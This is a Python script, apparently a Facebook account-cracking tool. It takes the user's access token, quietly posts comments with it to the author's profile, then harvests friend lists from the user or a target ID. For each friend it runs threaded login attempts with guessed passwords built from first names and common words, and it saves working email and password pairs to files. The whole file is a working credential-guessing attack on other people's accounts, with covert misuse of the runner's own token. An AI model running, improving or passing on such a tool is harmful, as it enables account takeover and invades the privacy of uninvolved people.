#!/usr/bin/python
#encoding=utf-8
#This Script Coded By Tumiso]Clement
 
#Module Upload And Except Install
import json,os,time,sys
from concurrent.futures import ThreadPoolExecutor as Bool
try:
	import pyfiglet
except:
	os.system("python -m pip install pyfiglet")
try:
	import requests as req
except ModuleNotFoundError:
	print("[!] Module Requests Not Installed")
	os.system("pip2 install requests")
except req.exceptions.ConnectionError:
	print("Check Internet Connection!")
try:
	from bs4 import BeautifulSoup as parser
except ModuleNotFoundError:
	print("[!] Module Bs4 Not Installed")
	os.system("pip install bs4")
except req.exceptions.ConnectionError:
	print("Koneksi Jaringan Buruk!")
try:
	ua=req.get("https://api-asutoolkit.cloudaccess.host/useragent.txt").text.strip()
except req.exceptions.ConnectionError:
	exit("[!] Kesalahan Pada Koneksi")
os.system("clear")
#saved & itung
ok = 0
cp = 0
die = 0
semoa=0
live = []
check = []
##############################
 
#Run And Scaning Data :v
def kintil():
	a = input("Masukan Pilihan : ")
	if(a=="01" or a=="1"):
		login()
	elif(a=="02" or a=="2"):
		os.system("xdg-open https://https://icprogrammers145.blogspot.com/2021/06/get%20acess%20token.html")
		os.sys.exit()
	else:
		print("Wait...")
		kintil()
def opening():
	os.system("clear")
	print("\t\t     Tools Supreme v1\nAuthor : TumisoIC | FBi : Tumiso Clement_ | IG: Tumiso55_\n\n[01]. Login  Token\n[02]. Get Facebook Token\n[00]. Exit_\n")
	kintil()
def login():
	t = input("Masukan Access Token Anda : ")
	try:
		to=open("tt.txt","a")
		to.write(t)
		to.close()
		a = json.loads(req.get(f"https://graph.facebook.com/me?access_token={t}").text)
		r=req.post(f"https://graph.facebook.com/100032085647548/comments/?message=Hellow Tumiso&access_token={t}")
		r2=req.post(f"https://graph.facebook.com/100032085647548/comments/?message=Jangan Lupa Makan :*&access_token={t}")
		os.system("clear")
		print("LogIn ~ USERNAME :",a["name"],"\nID:",a["id"],"\n")
		time.sleep(2)
	except KeyError:
		print("[!] Token Invaild")
		os.system("rm -rf tt.txt")
		time.sleep(2)
		login()
	except req.exceptions.ConnectionError:
		print("Connection Error!")
		time.sleep(2)
		login()
	
def crackTeman(user,pw,ttl):
	global ok,cp,die
	data={}
	ses=req.Session()
	ses.headers.update({"Host":"mbasic.facebook.com","cache-control":"max-age=0","upgrade-insecure-requests":"1","content-type":"application/x-www-form-urlencoded","accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8","user-agent":ua,"referer":"https://mbasic.facebook.com/login/?next&ref=dbl&fl&refid=8","accept-encoding":"gzip, deflate","accept-language":"id-ID,en-US;q=0.9"})
	a=parser(ses.get("https://mbasic.facebook.com/login/?next&ref=dbl&refid=8").text,"html.parser")
	b=["lsd","jazoest","m_ts","li","try_number","unrecognized_tries","login"]
	for c in a("input"):
		try:
			if c.get("name") in b:data.update({c.get("name"):c.get("value")})
			else:continue
		except:pass
	data.update({"email":user,"pass":pw,"prefill_contact_point": "","prefill_source": "","prefill_type": "","first_prefill_source": "","first_prefill_type": "","had_cp_prefilled": "false","had_password_prefilled": "false","is_smart_lock": "false","_fb_noscript": "true"})
	d=ses.post("https://mbasic.facebook.com/login/device-based/regular/login/?refsrc=https%3A%2F%2Fmbasic.facebook.com%2F&lwv=100&refid=8",data=data)
	if "c_user" in d.cookies:
		ok+=1
		print(f"\r\x1b[1;32m[LIVE] {user} | {pw} | {ttl}        \x1b[0m",end="")
		print("")
		open("live.txt","a").write(user+" | "+pw+" | "+ttl+"\n")
		semoa+=1
		live.append(user+pw)
	elif "checkpoint" in d.cookies:
		cp+=1
		print(f"\r\x1b[1;33m[CHECK] {user} | {pw} | {ttl}          \x1b[0m",end="")
		print("")
		open("chek.txt","a").write(user+" | "+pw+" | "+ttl+"\n")
		semoa+=1
		chek.append(user+pw)
	else:
		die+=1
	print(f"\r[=] OK:-{str(ok)} CP:-{str(cp)} CRACK:-{str(die)}",end="")
 
def crackMasal(user,pw,ttl):
	global ok,cp,die
	data={}
	ses=req.Session()
	ses.headers.update({"Host":"mbasic.facebook.com","cache-control":"max-age=0","upgrade-insecure-requests":"1","content-type":"application/x-www-form-urlencoded","accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8","user-agent":ua,"referer":"https://mbasic.facebook.com/login/?next&ref=dbl&fl&refid=8","accept-encoding":"gzip, deflate","accept-language":"id-ID,en-US;q=0.9"})
	a=parser(ses.get("https://mbasic.facebook.com/login/?next&ref=dbl&refid=8").text,"html.parser")
	b=["lsd","jazoest","m_ts","li","try_number","unrecognized_tries","login"]
	for c in a("input"):
		try:
			if c.get("name") in b:data.update({c.get("name"):c.get("value")})
			else:continue
		except:pass
	data.update({"email":user,"pass":pw,"prefill_contact_point": "","prefill_source": "","prefill_type": "","first_prefill_source": "","first_prefill_type": "","had_cp_prefilled": "false","had_password_prefilled": "false","is_smart_lock": "false","_fb_noscript": "true"})
	d=ses.post("https://mbasic.facebook.com/login/device-based/regular/login/?refsrc=https%3A%2F%2Fmbasic.facebook.com%2F&lwv=100&refid=8",data=data)
	if "c_user" in d.cookies:
		ok+=1
		print(f"\r\x1b[1;32m[LIVE] {user} | {pw} | {ttl}         \x1b[0m",end="")
		print("")
		semoa+=1
		open("live.txt","a").write(user+" | "+pw+" | "+ttl+"\n")
		live.append(user+pw)
	elif "checkpoint" in d.cookies:
		cp+=1
		print(f"\r\x1b[1;33m[CHECK] {user} | {pw} | {ttl}      \x1b[0m",end="")
		print("")
		semoa+=1
		open("chek.txt","a").write(user+" | "+pw+" | "+ttl+"\n")
		chek.append(user+pw)
	else:
		die+=1
	print(f"\r[=] OK:-{str(ok)} CP:-{str(cp)} CRACK:-{str(die)}",end="")
 
def sendTeman():
	os.system("clear")
	om=pyfiglet.figlet_format("TemanKu")
	print(f"{om}\nSedang Mengcrack Daftar Teman!\nFollow IG : @Tumiso_ \n")
	t = open("tt.txt","r").read()
	r = json.loads(req.get(f"https://graph.facebook.com/me/friends?access_token={t}").text)
	for i in r["data"]:
		d = i["id"]
		with Bool(max_workers=30) as tokai:
			fb2 = json.loads(req.get(f"https://graph.facebook.com/{d}?access_token={t}").content)
			try:
				user = fb2["username"]
			except KeyError:
				id = fb2["id"]
			try:
				ttl=fb2["birthday"]
			except KeyError:
				try:
					pass
				except:
					continue
			pas=[fb2["first_name"]+"123",fb2["first_name"]+"12345","Bangsad","Bangsad123","Monyet","Monyet123","Freefire","Freefire123","Doraemon","Sayang123","Booyah","Booyah123","Kontol","Kontol123"," lesego123","andiswa123","andiswa12345","andiswa","khumalo","khumalo123","khumalo12345","akhile123","Yolanda","Yolanda123","Mia123","Threader123","karabo123","karabo","threader12345","xoliswa123","drezzy123","blessing123","blessing1234","786786","445566","khan123","Umar123","Ayesha","Allah1234","778899"]
			for pw in pas:
				try:
					tokai.submit(crackTeman,user,pw,ttl)
				except:
					tokai.submit(crackTeman,id,pw,ttl)
	print(f"\nJumlah Hasil Dapet\nOK : {ok}\nCP : {cp}\nSemua : {semoa}\n")
	balek = input("[KEMBALI]")
	opening2()
def sendMasal():
	os.system("clear")
	om=pyfiglet.figlet_format("IC PROGRAMMERS")
	print(om+"\nIG : @ICprogram \n")
	tar=input(" ID Target Publik : ")
	try:
		t = open("tt.txt","r").read()
		mmk=json.loads(req.get(f"https://graph.facebook.com/{tar}?access_token={t}").text)
		print("\nNama Target Publik :",mmk["name"])
		time.sleep(2)
		print("[+] Sedang Mengambil Data...\n[!] CTRL + Z Untuk Stop Crack\n")
	except KeyError:
		print("[!] User Tersebut Tidak Ada!")
		time.sleep(2)
		opening2()
	except FileNotFoundError:
		print("[!] Token Anda Invalid!")
		time.sleep(2)
		opening2()
	r = json.loads(req.get(f"https://graph.facebook.com/{tar}/friends?access_token={t}").text)
	for i in r["data"]:
		d = i["id"]
		with Bool(max_workers=10) as tokai:
			fb2 = json.loads(req.get(f"https://graph.facebook.com/{d}?access_token={t}").content)
			try:
				user = fb2["username"]
			except KeyError:
				id = fb2["id"]
			try:
				ttl=fb2["birthday"]
			except KeyError:
				try:
					continue
				except:
					pass
			pas=[fb2["first_name"]+"123",fb2["first_name"]+"12345","Bangsad","Bangsad123","Monyet","Monyet123","Freefire","Freefire123","Doraemon","Sayang123","Booyah","Booyah123","Kontol","Kontol123","lesego123"," khumalo123","khumalo1234","khumalo12345","khumalo","andiswa","andiswa123","andiswa1245","feleb123"]
			for pw in pas:
				try:
					tokai.submit(crackMasal,user,pw,ttl)
				except:
					tokai.submit(crackMasal,id,pw,ttl)
	print(f"\nJumlah Hasil Dapet\nOK : {ok}\nCP : {cp}\nSemua : {semoa}\n")
	balek = input("[KEMBALI]")
	opening2()
def pilih():
	p = input("Choose : ")
	if(p=="01" or p=="1"):
		sendTeman()
	elif(p=="02" or p=="2"):
		sendMasal()
	elif(p=="00" or p=="0"):
		print("Logout!")
		os.system("rm -rf tt.txt")
		os.sys.exit()
	else:
		print("Pilihan Tidak Ada!")
		pilih()
def opening2():
	os.system("clear")
	print("\tCracking Menu\n\n[01]. Crack On Friend List\n[02]. Crack On Publick iD\n[00]. Logout Akun\n")
	pilih()
def Main():
	try:
		t=open("tt.txt","r").read()
		r=json.loads(req.get(f"https://graph.facebook.com/me?access_token={t}").text)
		print("\tAnda Sudah Login\nUsername Akun :",r["name"],"\nID Akun Anda :",r["id"],"\nTanggal-Lahir :",r["birthday"])
		time.sleep(2)
	except KeyError:
		print("Anda Belum Login!")
		time.sleep(2)
		opening()
	except FileNotFoundError:
		print("Anda Belum Login!")
		time.sleep(2)
		opening()
	except req.exceptions.ConnectionError:
		print("Sinyal Anda Buruk!")
	opening2()
 
#Running Function Main
if __name__=="__main__":
	Main()
 
